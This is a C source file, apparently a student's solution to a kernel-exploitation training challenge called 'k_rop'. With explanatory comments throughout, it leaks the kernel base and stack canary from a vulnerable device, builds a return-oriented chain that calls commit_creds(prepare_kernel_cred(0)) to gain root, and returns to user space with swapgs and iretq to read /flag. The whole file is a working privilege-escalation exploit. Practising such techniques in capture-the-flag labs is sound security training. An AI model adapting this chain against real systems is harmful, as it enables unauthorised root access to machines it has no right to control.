#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

// kaslr: position of mem objects is randomized
// smep: cannot execute code and referece data in user space -> without smep we can stack pivoting to user space and execute a ropchian there ???
// smap: cannot referece data in user space 

// the plan is to change out kernel creds commit_cred(prepare_kernel_cred(0)), get back to user space with privilege executions anc cat the flag.
// NOTE: looking at the run.sh, we cannot execute and reference (access) code in the user space

// Looking on ida, we see that the only variable we have is the buffer and that there is no "push rbp" (so we don't have a frame pointer). This means that 
// the second address we see is the return address of the "copy_from_user()" function (the first address is the canarin) <-- we can check it also using
// proc/kallsysms 

// getting kernel gatges : 
// - vmlinux-to-elf for changing the bzImage into an elf file (so we can see it in IDA and pass also it to ropper)
// ropper -f elf_kernel --no-color > tmp_gadgets.txt

#define SIZE 0X200 //don't copy too much (don't overflow the stack kernel base)
//no KASLR kernel_base, because the gadget are no KASLR
#define KERNEL_BASE 0xffffffff81000000 //at the beginning of the text section
#define LEAK_OFFSET 0x201532 //computed as the delta
//i leaked the address executing the exploit and subtracted the kernel from vmmap (i know it is the kernel because of the size)
#define OFF_POP_RDI_RET (0xffffffff810031c4 - KERNEL_BASE) //pop rdi; ret
#define OFF_PREPARE_KERNEL_CREDS (0xffffffff81094670 - KERNEL_BASE)//from IDA
#define OFF_MOV_RCX_RAX (0xffffffff814489f4-KERNEL_BASE) // mov rcx, rax; ret (1)
#define OFF_MOVE_RDI_RCX (0xffffffff810e8134-KERNEL_BASE) // mov rdi, rcx; ret (rdx must be zero!) (2)
#define OFF_POP_RDX_RET (0xffffffff81051398 - KERNEL_BASE) // pop rdx; ret (3)
#define OFF_COMMIT_CREDS (0xffffffff810943d0 - KERNEL_BASE) //from IDA
#define OFF_SWAPGS_RET (0xffffffff81c14530 - KERNEL_BASE) // swapgs; ret
#define OFF_IRETQ (0xffffffff8102c61b - KERNEL_BASE) // iretq; ... (every gadget is okay --> what there is after doesn't matter)

unsigned long long user_cs, rflags, user_rsp, user_ss;

// we need the function not to be called because it would change the value of rsp so we have to use the always_inline attribute
// code of get_regs put directly inside main function
__attribute__((always_inline)) void get_regs() {
    asm volatile(
        ".intel_syntax noprefix\n"
        "mov %0, cs;\n"
        "mov %1, rsp;\n"
        "mov %2, ss;\n"
        "pushf;\n" //push register file on stack
        "pop %3;\n"
        : "=r"(user_cs), "=r"(user_rsp), "=r"(user_ss), "=r"(rflags)
        :
        : 
    );
}

void win() {
    char buf[0X100] = {0};
    int fd = open("/flag", O_RDONLY);
    read(fd, buf, 0x100); 
    write(1, buf, 0x100); // better not to use functions like puts (so syscall) since there's the risk that the stack is no more alligned and so all will crash
}


int main(int argc, char** argv ) {
    char buff[SIZE];
    int fd, i;
    unsigned long long *ptr;
    ptr = (unsigned long long *)buff; //quadword

    fd = open("/dev/k_rop", O_RDWR);
    if (fd<0) {
        perror("open");
        return -1;
    }
    read(fd, buff, SIZE); //buff contains all the leaks
    for (i = 0; i < SIZE / 8; i++) {
        printf("%03d) 0x%llx\n", i, ptr[i]);
        //after the 0 i will have the canary and the ret address
    }

    get_regs(); //executed in user space
    unsigned long long kernel_base = ptr[33] - LEAK_OFFSET;

    //Plan: commit_creds(prepare_kernel_cred(0))
    // preparing the call to prepare kernel cred with the argument 0 (using pop rdi)
    ptr[33] = kernel_base + OFF_POP_RDI_RET;
    ptr[34] = 0;
    ptr[35] = kernel_base + OFF_PREPARE_KERNEL_CREDS;
    // now we have to move rax to rdi --> let's see if we can find a gadget (see gadgets (1,2,3))
    ptr[36] = kernel_base + OFF_MOV_RCX_RAX;
    ptr[37] = kernel_base + OFF_POP_RDX_RET;
    ptr[38] = 0;
    ptr[39] = kernel_base + OFF_MOVE_RDI_RCX;
    ptr[40] = 0xdeadbeef; // because the previous gadget increas the rsp by 8
    // now we have to call commit_creds
    ptr[41] = kernel_base + OFF_COMMIT_CREDS;
    // so know we have the process set to root
    // now we can return to user space using iretq. Iretq assumes that the stack is in the following format:
    // in user space gs is not used (null), exiting from kernel space we have to change it to avoid segfault
    // SWAPGS --> every time we call any function in the kernel, this is alway called: changes gs segment from user space to kernel space and viceversa
    ptr[42] = kernel_base + OFF_SWAPGS_RET;
    // IRETQ: used to go back to kernel space
    ptr[43] = kernel_base + OFF_IRETQ;
    // RIP
    ptr[44] = win; //function that prints me the flag: new return address
    // so before perfomring the exploit we have to take this addresses from user space and store them on the stack. 
    // To do so we use a function that can find them (get_gadgets)  
    // CS: poiter to code segment
    ptr[45] = user_cs;
    // RFLAGS: pointer to register flags
    ptr[46] = rflags;
    // RSP: stack pointer
    ptr[47] = user_rsp;
    // SS
    ptr[48] = user_ss;

    //alternative solution: commit_creds(init_root)
    //init root contains root credentials


    write(fd, buff, SIZE);
}

//sequence at very end: swapgs, ret, iretq
// at the end we have to return gracefully in user space because we print flag there
//%run upload_exploit.py initramfs/exploit k-rop.training.offensivedefensive.it 8080 --ssl -e /home/user/exploit